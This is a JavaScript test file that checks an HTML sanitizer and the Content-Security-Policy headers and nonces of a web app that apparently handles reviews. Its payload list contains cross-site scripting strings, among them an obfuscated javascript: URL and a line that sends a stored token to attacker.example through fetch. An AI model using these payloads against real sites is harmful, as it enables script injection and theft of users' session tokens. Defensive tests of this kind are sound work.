import assert from 'node:assert/strict';
import { test } from 'node:test';
import { JSDOM } from 'jsdom';
import { createServer } from 'node:http';

globalThis.window = new JSDOM('').window;
const { sanitizeHtml } = await import('../client/src/lib/sanitize.js');
const { default: app } = await import('../server/src/app.js');

test('stored attack payloads lose executable markup', () => {
  const payloads = [
    `<img src=x onerror="alert(localStorage.getItem('token'))">`,
    `<img src=x onerror="fetch('https://attacker.example/steal?t='+localStorage.getItem('token'))">`,
    '<svg onload="alert(1)"></svg>',
    '<script>alert(1)</script>',
    '<a href="javascript:alert(1)" onclick="alert(2)">link</a>',
    '<a href="jav&#x61;script:alert(1)">link</a>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
  ];
  for (const payload of payloads) {
    const doc = new JSDOM(sanitizeHtml(payload)).window.document;
    assert.equal(doc.querySelector('script,img,svg,iframe'), null);
    for (const element of doc.body.querySelectorAll('*')) {
      for (const attr of element.attributes) {
        assert.ok(!/^on/i.test(attr.name));
        assert.ok(!/javascript:/i.test(attr.value));
      }
    }
  }
});

test('legitimate review formatting survives', () => {
  const html = '<p><strong>Great</strong> <em>book</em><br><a href="https://example.com" title="Details">Details</a></p><ul><li>Useful</li></ul>';
  assert.equal(sanitizeHtml(html), html);
  assert.equal(sanitizeHtml(null), '');
});

test('API sends an enforcing CSP even on error responses', async () => {
  const server = createServer(app);
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  try {
    for (const path of ['/api/health', '/missing']) {
      const response = await fetch(`http://127.0.0.1:${server.address().port}${path}`);
      const csp = response.headers.get('content-security-policy');
      assert.match(csp, /script-src 'self';/);
      assert.match(csp, /script-src-attr 'none'/);
      assert.match(csp, /object-src 'none'/);
      assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval/);
      await response.text();
    }
  } finally {
    await new Promise(resolve => server.close(resolve));
  }
});

test('Vite HTML has a matching, fresh CSP nonce on every request', async () => {
  const { createServer: createViteServer } = await import('vite');
  const server = await createViteServer({ root: 'client', logLevel: 'error' });
  await server.listen();
  try {
    const nonces = [];
    for (let i = 0; i < 2; i++) {
      const response = await fetch('http://localhost:5175');
      const csp = response.headers.get('content-security-policy');
      const nonce = csp.match(/'nonce-([^']+)'/)[1];
      const html = await response.text();
      const doc = new JSDOM(html).window.document;
      assert.ok(doc.querySelectorAll('script').length > 0);
      for (const script of doc.querySelectorAll('script')) assert.equal(script.nonce, nonce);
      assert.equal(doc.querySelector('meta[property="csp-nonce"]').getAttribute('nonce'), nonce);
      assert.ok(!html.includes('__VITE_REQUEST_CSP_NONCE__'));
      assert.doesNotMatch(csp, /unsafe-inline|unsafe-eval/);
      nonces.push(nonce);
    }
    assert.notEqual(nonces[0], nonces[1]);
  } finally {
    await server.close();
  }
});
